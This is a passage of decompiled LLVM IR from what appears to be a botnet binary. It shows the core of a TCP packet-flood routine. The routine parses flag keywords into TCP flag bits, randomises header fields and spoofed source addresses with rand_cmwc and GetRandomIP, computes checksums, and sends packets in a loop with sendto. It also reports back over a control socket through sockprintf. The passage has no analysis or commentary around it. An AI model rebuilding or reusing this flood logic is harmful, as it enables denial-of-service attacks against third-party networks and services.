  %v3_804e324 = phi i8* [ %v5_804e19c, %dec_label_pc_804e1a4.lr.ph ], [ %tmp104, %dec_label_pc_804e335 ]
  %stack_var_-156.130 = phi i8* [ %tmp49, %dec_label_pc_804e1a4.lr.ph ], [ %stack_var_-156.0, %dec_label_pc_804e335 ]
  %stack_var_-160.129 = phi i32 [ %tmp48, %dec_label_pc_804e1a4.lr.ph ], [ %stack_var_-160.0, %dec_label_pc_804e335 ]
  %v4_804e1a4 = ptrtoint i8* %v3_804e324 to i32
  store i32 %v4_804e1a4, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e1a4, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8058773.304 to i32), i32* @edi, align 4
  %v6_804e1c2 = call i32 @_strncmp(i8* %v3_804e324, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058773.304, i32 0, i32 0), i32 4)
  %v7_804e1c2 = urem i32 %v6_804e1c2, 2
  %v8_804e1c2 = icmp eq i32 %v7_804e1c2, 0
  %v0_804e1c4 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e1c4 = or i1 %v0_804e1c4, %v8_804e1c2
  %v3_804e1c4 = zext i1 %v2_804e1c4 to i32
  %v4_804e1c4 = load i32, i32* @edx, align 4
  %v5_804e1c4 = and i32 %v4_804e1c4, -256
  %v6_804e1c4 = or i32 %v3_804e1c4, %v5_804e1c4
  %v7_804e1c4 = xor i32 %v6_804e1c4, 1
  store i32 %v7_804e1c4, i32* %edx.global-to-local, align 4
  %v3_804e1ca = and i32 %v6_804e1c2, -256
  %v1_804e1cc = trunc i32 %v7_804e1c4 to i8
  %v3_804e1cc = zext i1 %v0_804e1c4 to i8
  %v4_804e1cc = sub nsw i8 %v1_804e1cc, %v3_804e1cc
  %v15_804e1cc = icmp eq i8 %v4_804e1cc, 0
  %v20_804e1cc = zext i8 %v4_804e1cc to i32
  %v23_804e1cc = or i32 %v20_804e1cc, %v3_804e1ca
  store i32 %v23_804e1cc, i32* @ecx, align 4
  %v2_804e1d0 = sext i8 %v4_804e1cc to i32
  store i32 %v2_804e1d0, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e1d5 = icmp eq i1 %v15_804e1cc, false
  br i1 %v1_804e1d5, label %dec_label_pc_804e1e8, label %dec_label_pc_804e1d7

dec_label_pc_804e1d7:                             ; preds = %dec_label_pc_804e1a4
  store i32 %v1_804e0a3, i32* @eax, align 4
  %v3_804e1da = load i8, i8* %v2_804e311, align 1
  %v4_804e1da = zext i8 %v3_804e1da to i32
  %v7_804e1da = or i32 %v5_804e1c4, %v4_804e1da
  %v1_804e1dd = or i32 %v7_804e1da, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e1dd = trunc i32 %v1_804e1dd to i8
  store i32 %v1_804e1dd, i32* @edx, align 4
  store i8 %v3_804e1dd, i8* %v2_804e311, align 1
  br label %dec_label_pc_804e335

dec_label_pc_804e1e8:                             ; preds = %dec_label_pc_804e1a4
  store i32 %v4_804e1a4, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e1a4, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8058777.305 to i32), i32* @edi, align 4
  %v6_804e206 = call i32 @_strncmp(i8* %v3_804e324, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058777.305, i32 0, i32 0), i32 4)
  %v7_804e206 = urem i32 %v6_804e206, 2
  %v8_804e206 = icmp eq i32 %v7_804e206, 0
  %v0_804e208 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e208 = or i1 %v0_804e208, %v8_804e206
  %v3_804e208 = zext i1 %v2_804e208 to i32
  %v4_804e208 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e208 = and i32 %v4_804e208, -256
  %v6_804e208 = or i32 %v3_804e208, %v5_804e208
  %v7_804e208 = xor i32 %v6_804e208, 1
  store i32 %v7_804e208, i32* %edx.global-to-local, align 4
  %v3_804e20e = and i32 %v6_804e206, -256
  %v1_804e210 = trunc i32 %v7_804e208 to i8
  %v3_804e210 = zext i1 %v0_804e208 to i8
  %v4_804e210 = sub nsw i8 %v1_804e210, %v3_804e210
  %v15_804e210 = icmp eq i8 %v4_804e210, 0
  %v20_804e210 = zext i8 %v4_804e210 to i32
  %v23_804e210 = or i32 %v20_804e210, %v3_804e20e
  store i32 %v23_804e210, i32* @ecx, align 4
  %v2_804e214 = sext i8 %v4_804e210 to i32
  store i32 %v2_804e214, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e219 = icmp eq i1 %v15_804e210, false
  br i1 %v1_804e219, label %dec_label_pc_804e22c, label %dec_label_pc_804e21b

dec_label_pc_804e21b:                             ; preds = %dec_label_pc_804e1e8
  store i32 %v1_804e0a3, i32* @eax, align 4
  %v3_804e21e = load i8, i8* %v2_804e311, align 1
  %v4_804e21e = zext i8 %v3_804e21e to i32
  %v7_804e21e = or i32 %v5_804e208, %v4_804e21e
  %v1_804e221 = or i32 %v7_804e21e, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e221 = trunc i32 %v1_804e221 to i8
  store i32 %v1_804e221, i32* @edx, align 4
  store i8 %v3_804e221, i8* %v2_804e311, align 1
  br label %dec_label_pc_804e335

dec_label_pc_804e22c:                             ; preds = %dec_label_pc_804e1e8
  store i32 %v4_804e1a4, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e1a4, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805877b.306 to i32), i32* @edi, align 4
  %v6_804e250 = call i32 @_strncmp(i8* %v3_804e324, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805877b.306, i32 0, i32 0), i32 4)
  %v7_804e250 = urem i32 %v6_804e250, 2
  %v8_804e250 = icmp eq i32 %v7_804e250, 0
  %v0_804e252 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e252 = or i1 %v0_804e252, %v8_804e250
  %v3_804e252 = zext i1 %v2_804e252 to i32
  %v4_804e252 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e252 = and i32 %v4_804e252, -256
  %v6_804e252 = or i32 %v3_804e252, %v5_804e252
  %v7_804e252 = xor i32 %v6_804e252, 1
  store i32 %v7_804e252, i32* %edx.global-to-local, align 4
  %v3_804e258 = and i32 %v6_804e250, -256
  %v1_804e25a = trunc i32 %v7_804e252 to i8
  %v3_804e25a = zext i1 %v0_804e252 to i8
  %v4_804e25a = sub nsw i8 %v1_804e25a, %v3_804e25a
  %v15_804e25a = icmp eq i8 %v4_804e25a, 0
  %v20_804e25a = zext i8 %v4_804e25a to i32
  %v23_804e25a = or i32 %v20_804e25a, %v3_804e258
  store i32 %v23_804e25a, i32* @ecx, align 4
  %v2_804e25e = sext i8 %v4_804e25a to i32
  store i32 %v2_804e25e, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e263 = icmp eq i1 %v15_804e25a, false
  br i1 %v1_804e263, label %dec_label_pc_804e276, label %dec_label_pc_804e265

dec_label_pc_804e265:                             ; preds = %dec_label_pc_804e22c
  store i32 %v1_804e0a3, i32* @eax, align 4
  %v3_804e268 = load i8, i8* %v2_804e311, align 1
  %v4_804e268 = zext i8 %v3_804e268 to i32
  %v7_804e268 = or i32 %v5_804e252, %v4_804e268
  %v1_804e26b = or i32 %v7_804e268, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e26b = trunc i32 %v1_804e26b to i8
  store i32 %v1_804e26b, i32* @edx, align 4
  store i8 %v3_804e26b, i8* %v2_804e311, align 1
  br label %dec_label_pc_804e335

dec_label_pc_804e276:                             ; preds = %dec_label_pc_804e22c
  store i32 %v4_804e1a4, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e1a4, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805877f.307 to i32), i32* @edi, align 4
  %v6_804e2a6 = call i32 @_strncmp(i8* %v3_804e324, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805877f.307, i32 0, i32 0), i32 4)
  %v7_804e2a6 = urem i32 %v6_804e2a6, 2
  %v8_804e2a6 = icmp eq i32 %v7_804e2a6, 0
  %v0_804e2a8 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e2a8 = or i1 %v0_804e2a8, %v8_804e2a6
  %v3_804e2a8 = zext i1 %v2_804e2a8 to i32
  %v4_804e2a8 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e2a8 = and i32 %v4_804e2a8, -256
  %v6_804e2a8 = or i32 %v3_804e2a8, %v5_804e2a8
  %v7_804e2a8 = xor i32 %v6_804e2a8, 1
  store i32 %v7_804e2a8, i32* %edx.global-to-local, align 4
  %v3_804e2ae = and i32 %v6_804e2a6, -256
  %v1_804e2b0 = trunc i32 %v7_804e2a8 to i8
  %v3_804e2b0 = zext i1 %v0_804e2a8 to i8
  %v4_804e2b0 = sub nsw i8 %v1_804e2b0, %v3_804e2b0
  %v15_804e2b0 = icmp eq i8 %v4_804e2b0, 0
  %v20_804e2b0 = zext i8 %v4_804e2b0 to i32
  %v23_804e2b0 = or i32 %v20_804e2b0, %v3_804e2ae
  store i32 %v23_804e2b0, i32* @ecx, align 4
  %v2_804e2b4 = sext i8 %v4_804e2b0 to i32
  store i32 %v2_804e2b4, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e2b9 = icmp eq i1 %v15_804e2b0, false
  br i1 %v1_804e2b9, label %dec_label_pc_804e2c9, label %dec_label_pc_804e2bb

dec_label_pc_804e2bb:                             ; preds = %dec_label_pc_804e276
  store i32 %v1_804e0a3, i32* @eax, align 4
  %v3_804e2be = load i8, i8* %v2_804e311, align 1
  %v4_804e2be = zext i8 %v3_804e2be to i32
  %v7_804e2be = or i32 %v5_804e2a8, %v4_804e2be
  %v1_804e2c1 = or i32 %v7_804e2be, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e2c1 = trunc i32 %v1_804e2c1 to i8
  store i32 %v1_804e2c1, i32* @edx, align 4
  store i8 %v3_804e2c1, i8* %v2_804e311, align 1
  br label %dec_label_pc_804e335

dec_label_pc_804e2c9:                             ; preds = %dec_label_pc_804e276
  store i32 %v4_804e1a4, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e1a4, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8058783.308 to i32), i32* @edi, align 4
  %v6_804e2f9 = call i32 @_strncmp(i8* %v3_804e324, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058783.308, i32 0, i32 0), i32 4)
  %v7_804e2f9 = urem i32 %v6_804e2f9, 2
  %v8_804e2f9 = icmp eq i32 %v7_804e2f9, 0
  %v0_804e2fb = load i1, i1* %cf.global-to-local, align 1
  %v2_804e2fb = or i1 %v0_804e2fb, %v8_804e2f9
  %v3_804e2fb = zext i1 %v2_804e2fb to i32
  %v4_804e2fb = load i32, i32* %edx.global-to-local, align 4
  %v5_804e2fb = and i32 %v4_804e2fb, -256
  %v6_804e2fb = or i32 %v3_804e2fb, %v5_804e2fb
  %v7_804e2fb = xor i32 %v6_804e2fb, 1
  store i32 %v7_804e2fb, i32* %edx.global-to-local, align 4
  %v3_804e301 = and i32 %v6_804e2f9, -256
  %v1_804e303 = trunc i32 %v7_804e2fb to i8
  %v3_804e303 = zext i1 %v0_804e2fb to i8
  %v4_804e303 = sub nsw i8 %v1_804e303, %v3_804e303
  %v15_804e303 = icmp eq i8 %v4_804e303, 0
  %v20_804e303 = zext i8 %v4_804e303 to i32
  %v23_804e303 = or i32 %v20_804e303, %v3_804e301
  store i32 %v23_804e303, i32* @ecx, align 4
  %v2_804e307 = sext i8 %v4_804e303 to i32
  store i32 %v2_804e307, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e30c = icmp eq i1 %v15_804e303, false
  br i1 %v1_804e30c, label %dec_label_pc_804e31c, label %dec_label_pc_804e30e

dec_label_pc_804e30e:                             ; preds = %dec_label_pc_804e2c9
  store i32 %v1_804e0a3, i32* @eax, align 4
  %v3_804e311 = load i8, i8* %v2_804e311, align 1
  %v4_804e311 = zext i8 %v3_804e311 to i32
  %v7_804e311 = or i32 %v5_804e2fb, %v4_804e311
  %v1_804e314 = or i32 %v7_804e311, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e314 = trunc i32 %v1_804e314 to i8
  store i32 %v1_804e314, i32* @edx, align 4
  store i8 %v3_804e314, i8* %v2_804e311, align 1
  br label %dec_label_pc_804e335

dec_label_pc_804e31c:                             ; preds = %dec_label_pc_804e2c9
  %v0_804e31c = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804e31c, i32* %eax.global-to-local, align 4
  %v0_804e321 = load i32, i32* @esp, align 4
  %v5_804e321 = icmp ult i32 %v0_804e321, 4
  store i1 %v5_804e321, i1* %cf.global-to-local, align 1
  %v6_804e324 = add i32 %v0_804e321, -8
  %v7_804e324 = inttoptr i32 %v6_804e324 to i32*
  store i32 %v4_804e1a4, i32* %v7_804e324, align 4
  %v1_804e327 = add i32 %v0_804e321, -12
  %v2_804e327 = inttoptr i32 %v1_804e327 to i32*
  store i32 ptrtoint ([18 x i8]* @global_var_8058787.309 to i32), i32* %v2_804e327, align 4
  %v0_804e32c = load i32, i32* %eax.global-to-local, align 4
  %v2_804e32c = add i32 %v0_804e321, -16
  %v3_804e32c = inttoptr i32 %v2_804e32c to i32*
  store i32 %v0_804e32c, i32* %v3_804e32c, align 4
  %v3_804e32d = call i32 @sockprintf(i32 4, i32 ptrtoint ([4 x i8]* @global_var_8058783.308 to i32))
  store i32 %v3_804e32d, i32* @eax, align 4
  %v0_804e332 = load i32, i32* @esp, align 4
  %v2_804e332 = icmp ugt i32 %v0_804e332, -17
  store i1 %v2_804e332, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804e335

dec_label_pc_804e335:                             ; preds = %dec_label_pc_804e30e, %dec_label_pc_804e2bb, %dec_label_pc_804e265, %dec_label_pc_804e21b, %dec_label_pc_804e1d7, %dec_label_pc_804e31c
  %stack_var_-160.0 = phi i32 [ 4, %dec_label_pc_804e31c ], [ 4, %dec_label_pc_804e30e ], [ %stack_var_-160.129, %dec_label_pc_804e2bb ], [ %stack_var_-160.129, %dec_label_pc_804e265 ], [ %stack_var_-160.129, %dec_label_pc_804e21b ], [ %stack_var_-160.129, %dec_label_pc_804e1d7 ]
  %stack_var_-156.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058783.308, i32 0, i32 0), %dec_label_pc_804e31c ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058783.308, i32 0, i32 0), %dec_label_pc_804e30e ], [ %stack_var_-156.130, %dec_label_pc_804e2bb ], [ %stack_var_-156.130, %dec_label_pc_804e265 ], [ %stack_var_-156.130, %dec_label_pc_804e21b ], [ %stack_var_-156.130, %dec_label_pc_804e1d7 ]
  %v0_804e335 = load i32, i32* @esp, align 4
  %v5_804e335 = icmp ult i32 %v0_804e335, 8
  store i1 %v5_804e335, i1* %cf.global-to-local, align 1
  %v1_804e338 = add i32 %v0_804e335, -12
  %v2_804e338 = inttoptr i32 %v1_804e338 to i32*
  store i32 ptrtoint (i32* @global_var_8058771.303 to i32), i32* %v2_804e338, align 4
  %v1_804e33d = add i32 %v0_804e335, -16
  %v2_804e33d = inttoptr i32 %v1_804e33d to i32*
  store i32 0, i32* %v2_804e33d, align 4
  %v2_804e33f = ptrtoint i8* %stack_var_-156.0 to i32
  %v3_804e33f = call i32 @__GI_strtok(i32 %stack_var_-160.0, i32 %v2_804e33f)
  store i32 %v3_804e33f, i32* %eax.global-to-local, align 4
  store i32 %v3_804e33f, i32* %tmp103, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804e34a = icmp eq i32 %v3_804e33f, 0
  %v1_804e34e = icmp eq i1 %v5_804e34a, false
  %tmp104 = inttoptr i32 %v3_804e33f to i8*
  br i1 %v1_804e34e, label %dec_label_pc_804e1a4, label %dec_label_pc_804e354

dec_label_pc_804e354:                             ; preds = %dec_label_pc_804e335, %dec_label_pc_804e188, %dec_label_pc_804e147
  %v0_804e354 = phi i8* [ %v0_804e354.pre, %dec_label_pc_804e147 ], [ %v5_804e19c, %dec_label_pc_804e188 ], [ %tmp104, %dec_label_pc_804e335 ]
  %v1_804e354 = ptrtoint i8* %v0_804e354 to i32
  %v2_804e354 = call i32 @rand_cmwc(i32 %v1_804e354)
  %sext8 = mul i32 %v2_804e354, 65536
  %v1_804e359 = sdiv i32 %sext8, 65536
  store i32 %v1_804e359, i32* %edx.global-to-local, align 4
  %v1_804e35e = trunc i32 %v1_804e359 to i16
  %v3_804e35e = add i32 %v2_804e08b, 34
  %v4_804e35e = inttoptr i32 %v3_804e35e to i16*
  store i16 %v1_804e35e, i16* %v4_804e35e, align 2
  %v1_804e365 = add i32 %v2_804e08b, 36
  %v2_804e365 = inttoptr i32 %v1_804e365 to i16*
  store i16 0, i16* %v2_804e365, align 4
  store i32 %v1_804e0a3, i32* %eax.global-to-local, align 4
  %v1_804e36e = add i32 %v2_804e08b, 38
  %v2_804e36e = inttoptr i32 %v1_804e36e to i16*
  store i16 0, i16* %v2_804e36e, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_804df7a, label %dec_label_pc_804e385, label %dec_label_pc_804e37a

dec_label_pc_804e37a:                             ; preds = %dec_label_pc_804e354
  %v0_804e37a = load i8*, i8** %stack_var_-20, align 4
  %v1_804e37a = ptrtoint i8* %v0_804e37a to i32
  %v2_804e37a = call i32 @rand_cmwc(i32 %v1_804e37a)
  store i32 %v2_804e37a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e39d

dec_label_pc_804e385:                             ; preds = %dec_label_pc_804e354
  %v1_804e388 = urem i32 %arg2, 65536
  store i32 %v1_804e388, i32* %eax.global-to-local, align 4
  %v0_804e38d = load i32, i32* @esp, align 4
  %v5_804e38d = icmp ult i32 %v0_804e38d, 12
  store i1 %v5_804e38d, i1* %cf.global-to-local, align 1
  %v2_804e390 = add i32 %v0_804e38d, -16
  %v3_804e390 = inttoptr i32 %v2_804e390 to i32*
  store i32 %v1_804e388, i32* %v3_804e390, align 4
  %v1_804e391 = sext i16 %tmp47 to i32
  %v2_804e391 = call i32 @htons(i32 %v1_804e391)
  store i32 %v2_804e391, i32* %eax.global-to-local, align 4
  %v0_804e396 = load i32, i32* @esp, align 4
  %v2_804e396 = icmp ugt i32 %v0_804e396, -17
  store i1 %v2_804e396, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804e39d

dec_label_pc_804e39d:                             ; preds = %dec_label_pc_804e37a, %dec_label_pc_804e385
  %storemerge.in = phi i32 [ %v2_804e391, %dec_label_pc_804e385 ], [ %v2_804e37a, %dec_label_pc_804e37a ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i32 %v1_804e0a3, i32* %eax.global-to-local, align 4
  %v4_804e3a0 = urem i32 %storemerge.in, 65536
  %v5_804e3a0 = load i32, i32* @esi, align 4
  %v6_804e3a0 = and i32 %v5_804e3a0, -65536
  %v7_804e3a0 = or i32 %v6_804e3a0, %v4_804e3a0
  store i32 %v7_804e3a0, i32* @esi, align 4
  %v3_804e3a4 = add i32 %v2_804e08b, 22
  %v4_804e3a4 = inttoptr i32 %v3_804e3a4 to i16*
  store i16 %storemerge, i16* %v4_804e3a4, align 2
  %v0_804e3a8 = load i32, i32* @esp, align 4
  %v5_804e3a8 = icmp ult i32 %v0_804e3a8, 8
  store i1 %v5_804e3a8, i1* %cf.global-to-local, align 1
  %v6_804e3ab = add i32 %v0_804e3a8, -12
  %v7_804e3ab = inttoptr i32 %v6_804e3ab to i32*
  store i32 %v1_804e0a3, i32* %v7_804e3ab, align 4
  %v5_804e3ae = add i32 %v0_804e3a8, -16
  %v6_804e3ae = inttoptr i32 %v5_804e3ae to i32*
  store i32 %v2_804e08b, i32* %v6_804e3ae, align 4
  %v0_804e3b1 = call i32 @tcpcsum()
  %v1_804e3b1 = trunc i32 %v0_804e3b1 to i16
  %sext13 = mul i32 %v0_804e3b1, 65536
  %v1_804e3b9 = sdiv i32 %sext13, 65536
  store i32 %v1_804e3b9, i32* %edx.global-to-local, align 4
  store i16 %v1_804e3b1, i16* %v2_804e365, align 4
  store i32 %v2_804e08b, i32* %eax.global-to-local, align 4
  %v1_804e3c5 = or i32 %v2_804e08b, 2
  %v2_804e3c5 = inttoptr i32 %v1_804e3c5 to i16*
  %v3_804e3c5 = load i16, i16* %v2_804e3c5, align 2
  %v4_804e3c5 = zext i16 %v3_804e3c5 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_804e3c5, i32* %edx.global-to-local, align 4
  store i32 %v2_804e08b, i32* %eax.global-to-local, align 4
  %v1_804e3d4 = load i32, i32* @esp, align 4
  %v2_804e3d4 = add i32 %v1_804e3d4, -4
  %v3_804e3d4 = inttoptr i32 %v2_804e3d4 to i32*
  store i32 %v4_804e3c5, i32* %v3_804e3d4, align 4
  %v0_804e3d5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e3d5 = add i32 %v1_804e3d4, -8
  %v3_804e3d5 = inttoptr i32 %v2_804e3d5 to i32*
  store i32 %v0_804e3d5, i32* %v3_804e3d5, align 4
  %sext14 = mul i32 %storemerge.in, 65536
  %v1_804e3d6 = sdiv i32 %sext14, 65536
  %v3_804e3d6 = inttoptr i32 %v1_804e3d6 to i16*
  %v4_804e3d6 = call i32 @csum(i16* %v3_804e3d6, i32 ptrtoint (i32* @0 to i32))
  %v5_804e3d6 = trunc i32 %v4_804e3d6 to i16
  %sext15 = mul i32 %v4_804e3d6, 65536
  %v1_804e3de = sdiv i32 %sext15, 65536
  store i32 %v1_804e3de, i32* %edx.global-to-local, align 4
  store i32 %v2_804e08b, i32* %eax.global-to-local, align 4
  %v3_804e3e3 = or i32 %v2_804e08b, 10
  %v4_804e3e3 = inttoptr i32 %v3_804e3e3 to i16*
  store i16 %v5_804e3d6, i16* %v4_804e3e3, align 2
  %v0_804e3e7 = load i32, i32* @esp, align 4
  %v5_804e3e7 = icmp ult i32 %v0_804e3e7, 12
  store i1 %v5_804e3e7, i1* %cf.global-to-local, align 1
  %v1_804e3ea = add i32 %v0_804e3e7, -16
  %v2_804e3ea = inttoptr i32 %v1_804e3ea to i32*
  store i32 0, i32* %v2_804e3ea, align 4
  %v2_804e3ec = inttoptr i32 %v1_804e3d6 to i32*
  %v3_804e3ec = call i32 @__GI_time(i32* %v2_804e3ec)
  %v0_804e3f1 = load i32, i32* @esp, align 4
  %v1_804e3f1 = add i32 %v0_804e3f1, 16
  %v5_804e3f4 = add i32 %v3_804e3ec, %arg3
  %v10_804e3f4 = icmp ult i32 %v5_804e3f4, %v3_804e3ec
  store i1 %v10_804e3f4, i1* %cf.global-to-local, align 1
  store i32 %v5_804e3f4, i32* %eax.global-to-local, align 4
  %v2_804e43f = or i32 %v2_804e08b, 12
  %v3_804e43f = inttoptr i32 %v2_804e43f to i32*
  %v3_804e44c = or i32 %v2_804e08b, 4
  %v4_804e44c = inttoptr i32 %v3_804e44c to i16*
  br label %dec_label_pc_804e403

dec_label_pc_804e403:                             ; preds = %dec_label_pc_804e4ba, %dec_label_pc_804e4d8, %dec_label_pc_804e39d
  %v0_804e409 = phi i32 [ %v1_804e3f1, %dec_label_pc_804e39d ], [ %v0_804e409.pre.pre, %dec_label_pc_804e4d8 ], [ %v1_804e4c4, %dec_label_pc_804e4ba ]
  %stack_var_-68.0 = phi i32 [ 0, %dec_label_pc_804e39d ], [ %v4_804e4d8, %dec_label_pc_804e4d8 ], [ 0, %dec_label_pc_804e4ba ]
  store i32 %v2_804dfa2, i32* %eax.global-to-local, align 4
  store i32 %v2_804e08b, i32* %edx.global-to-local, align 4
  %v5_804e409 = icmp ult i32 %v0_804e409, 8
  store i1 %v5_804e409, i1* %cf.global-to-local, align 1
  %v1_804e40c = add i32 %v0_804e409, -12
  %v2_804e40c = inttoptr i32 %v1_804e40c to i32*
  store i32 16, i32* %v2_804e40c, align 4
  %v2_804e40e = add i32 %v0_804e409, -16
  %v3_804e40e = inttoptr i32 %v2_804e40e to i32*
  store i32 %v2_804dfa2, i32* %v3_804e40e, align 4
  %v1_804e40f = add i32 %v0_804e409, -20
  %v2_804e40f = inttoptr i32 %v1_804e40f to i32*
  store i32 0, i32* %v2_804e40f, align 4
  %v5_804e411 = add i32 %v0_804e409, -24
  %v6_804e411 = inttoptr i32 %v5_804e411 to i32*
  store i32 %v1_804e06b, i32* %v6_804e411, align 4
  %v0_804e414 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e414 = add i32 %v0_804e409, -28
  %v3_804e414 = inttoptr i32 %v2_804e414 to i32*
  store i32 %v0_804e414, i32* %v3_804e414, align 4
  %v5_804e415 = add i32 %v0_804e409, -32
  %v6_804e415 = inttoptr i32 %v5_804e415 to i32*
  store i32 %v4_804dfd9, i32* %v6_804e415, align 4
  %v1_804e418 = load i32, i32* %stack_var_-64, align 4
  %v2_804e418 = load i32, i32* %stack_var_-60, align 4
  %v3_804e418 = load i32, i32* %stack_var_-56, align 4
  %v4_804e418 = load i32, i32* %stack_var_-52, align 4
  %v6_804e418 = call i32 @__libc_sendto(i32 %stack_var_-68.0, i32 %v1_804e418, i32 %v2_804e418, i32 %v3_804e418, i32 %v4_804e418, i32 0)
  store i32 %v6_804e418, i32* %eax.global-to-local, align 4
  %v0_804e41d = load i32, i32* @esp, align 4
  %v1_804e41d = add i32 %v0_804e41d, 32
  %v5_804e420 = icmp ult i32 %v1_804e41d, 12
  store i1 %v5_804e420, i1* %cf.global-to-local, align 1
  %v5_804e423 = add i32 %v0_804e41d, 16
  %v6_804e423 = inttoptr i32 %v5_804e423 to i32*
  store i32 %storemerge12, i32* %v6_804e423, align 4
  %v1_804e426 = load i32, i32* %stack_var_-64, align 4
  %v2_804e426 = call i32 @GetRandomIP(i32 %stack_var_-68.0, i32 %v1_804e426)
  store i32 %v2_804e426, i32* %eax.global-to-local, align 4
  %v0_804e42b = load i32, i32* @esp, align 4
  %v1_804e42b = add i32 %v0_804e42b, 16
  %v5_804e42e = icmp ult i32 %v1_804e42b, 12
  store i1 %v5_804e42e, i1* %cf.global-to-local, align 1
  %v3_804e431 = inttoptr i32 %v0_804e42b to i32*
  store i32 %v2_804e426, i32* %v3_804e431, align 4
  %v0_804e432 = call i32 @htonl()
  %v0_804e437 = load i32, i32* @esp, align 4
  %v2_804e437 = icmp ugt i32 %v0_804e437, -17
  store i1 %v2_804e437, i1* %cf.global-to-local, align 1
  store i32 %v0_804e432, i32* %edx.global-to-local, align 4
  store i32 %v2_804e08b, i32* %eax.global-to-local, align 4
  store i32 %v0_804e432, i32* %v3_804e43f, align 4
  %v1_804e442 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %sext9 = mul i32 %v1_804e442, 65536
  %v1_804e447 = sdiv i32 %sext9, 65536
  store i32 %v1_804e447, i32* %edx.global-to-local, align 4
  store i32 %v2_804e08b, i32* %eax.global-to-local, align 4
  %v1_804e44c = trunc i32 %v1_804e447 to i16
  store i16 %v1_804e44c, i16* %v4_804e44c, align 4
  %v1_804e450 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  store i32 %v1_804e450, i32* %edx.global-to-local, align 4
  store i32 %v1_804e0a3, i32* %eax.global-to-local, align 4
  store i32 %v1_804e450, i32* %v3_804e0f8, align 8
  %v1_804e45d = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %sext10 = mul i32 %v1_804e45d, 65536
  %v1_804e462 = sdiv i32 %sext10, 65536
  store i32 %v1_804e462, i32* %edx.global-to-local, align 4
  %v1_804e467 = trunc i32 %v1_804e462 to i16
  store i16 %v1_804e467, i16* %v5_804e0a6, align 4
  store i32 %v1_804e0a3, i32* %eax.global-to-local, align 4
  store i16 0, i16* %v2_804e365, align 4
  %v0_804e473 = load i32, i32* @esp, align 4
  %v5_804e473 = icmp ult i32 %v0_804e473, 8
  store i1 %v5_804e473, i1* %cf.global-to-local, align 1
  %v6_804e476 = add i32 %v0_804e473, -12
  %v7_804e476 = inttoptr i32 %v6_804e476 to i32*
  store i32 %v1_804e0a3, i32* %v7_804e476, align 4
  %v5_804e479 = add i32 %v0_804e473, -16
  %v6_804e479 = inttoptr i32 %v5_804e479 to i32*
  store i32 %v2_804e08b, i32* %v6_804e479, align 4
  %v0_804e47c = call i32 @tcpcsum()
  %v1_804e47c = trunc i32 %v0_804e47c to i16
  %sext17 = mul i32 %v0_804e47c, 65536
  %v1_804e484 = sdiv i32 %sext17, 65536
  store i32 %v1_804e484, i32* %edx.global-to-local, align 4
  store i16 %v1_804e47c, i16* %v2_804e365, align 4
  store i32 %v2_804e08b, i32* %eax.global-to-local, align 4
  %v3_804e490 = load i16, i16* %v2_804e3c5, align 2
  %v4_804e490 = zext i16 %v3_804e490 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_804e490, i32* %edx.global-to-local, align 4
  store i32 %v2_804e08b, i32* %eax.global-to-local, align 4
  %v1_804e49f = load i32, i32* @esp, align 4
  %v2_804e49f = add i32 %v1_804e49f, -4
  %v3_804e49f = inttoptr i32 %v2_804e49f to i32*
  store i32 %v4_804e490, i32* %v3_804e49f, align 4
  %v0_804e4a0 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e4a0 = add i32 %v1_804e49f, -8
  %v3_804e4a0 = inttoptr i32 %v2_804e4a0 to i32*
